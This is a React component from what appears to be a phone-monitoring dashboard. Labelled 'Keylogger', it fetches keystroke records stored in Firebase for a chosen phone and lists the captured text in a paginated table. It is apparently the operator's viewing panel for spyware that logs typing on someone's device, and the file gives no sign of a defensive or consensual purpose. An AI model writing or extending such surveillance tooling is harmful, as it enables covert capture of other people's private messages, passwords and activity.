import { ref, get, child } from "firebase/database";
import { auth, db } from '../firebase';
import React, { useState, useEffect } from 'react';
import { onAuthStateChanged } from "firebase/auth";
import DataTable from 'react-data-table-component';

export default function KeyLogger(props) {
    const [keylogs, setKeyLogs] = useState([]);
    const { phone } = props;
    const columns = [
        {
            name: 'Données',
            selector: row => row.keyText,
            sortable: true,
        }
    ];

    useEffect(() => {
        if (phone) {
            onAuthStateChanged(auth, (user) => {
                const dbRef = ref(db);
                get(child(dbRef, `user/${user.uid}/${phone}/keyLogger/data`)).then((snapshot) => {
                    if (snapshot.exists()) {
                        Object.values(snapshot.val()).map((key) => {
                            setKeyLogs((prev) => [...prev, key]);
                        })
                        //setKeyLogs(snapshot.val());
                    } else {
                        console.log("No data available");
                    }
                }).catch((error) => {
                    console.error(error);
                });
            });
        }
    }, [phone])

    return <div className="card p-3"  style={{ height: 'auto'}}>
        <h1>Keylogger</h1>

        <DataTable columns={columns} data={keylogs} pagination/>

        {/*<table className="table">
            <thead>
            <tr>
                <td>Données</td>
            </tr>
            </thead>
            <tbody>
            {
                keylogs.map((log, index) => (
                    <tr key={index}>
                        <td>{log.keyText}</td>
                    </tr>
                ))
            }
            </tbody>
        </table>*/}

    </div>
}